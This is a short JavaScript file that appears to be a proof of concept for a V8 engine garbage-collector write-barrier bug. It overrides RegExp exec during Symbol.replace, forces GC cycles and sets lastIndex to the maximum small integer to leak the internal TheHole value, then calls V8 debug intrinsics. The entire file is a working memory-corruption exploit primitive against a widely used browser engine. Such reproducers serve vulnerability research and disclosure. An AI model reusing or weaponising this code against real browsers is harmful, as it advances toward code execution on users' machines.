var ref = new Array(1000000);
var rid = 0;

function major_gc() {
	new ArrayBuffer(0x7fe00000);
}

function minor_gc() {
	for (var i = 0; i < 8; i++) {
		// fill up new space external backing store bytes
		ref[i] = new ArrayBuffer(0x200000);
	}
	ref = new ArrayBuffer(8);
}

var re = new RegExp('foo', 'g');

var tmp = re.exec;
var match_object = {};
match_object[0] = {
    toString : function() {
        return "";
    }
};

re.exec = function() {
    major_gc();
    delete re.exec; // transition back to initial regexp map
    re.lastIndex = 1073741823; // maximum smi, adding one will result in a HeapNumber
    new Array(4096); // add space before NewHeapNumber<newSpace>
    RegExp.prototype.exec = function() {
        throw ''; // break out of Regexp.replace
    }
    return match_object;
};

try {
    var newstr = re[Symbol.replace]("fooooo", ".$");
} catch(e) {}


minor_gc(); // trigger write-barrier
major_gc(); // more determinstic GC

new Array(8192); // spray TheHole

%DebugPrint(re.lastIndex); // leak TheHole

%SystemBreak();
